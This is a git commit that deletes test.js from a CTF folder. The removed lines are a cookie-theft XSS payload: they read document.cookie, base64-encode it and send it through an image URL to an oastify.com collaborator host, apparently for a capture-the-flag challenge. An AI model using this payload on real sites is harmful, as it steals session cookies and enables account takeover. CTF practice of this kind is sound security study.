fd74338deb86aa8b9900513ad4f1b0df0b62b9b1
Saurabh <skumar1@mt.iitr.ac.in>
2022-09-21 10:40:17 +0530

    Delete test.js

--- ctf/test.js
+++
@@ -1,7 +0,0 @@
-const xhr = new XMLHttpRequest();
-xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
-let ck = document.cookie;
-xhr.onreadystatechange = function() {
-  document.write('<img src=http://w30mh75olm56uzy7ch3tfv9ev51vpk.oastify.com/leak.txt?' + btoa(ck) + '>');
-};
-xhr.send();
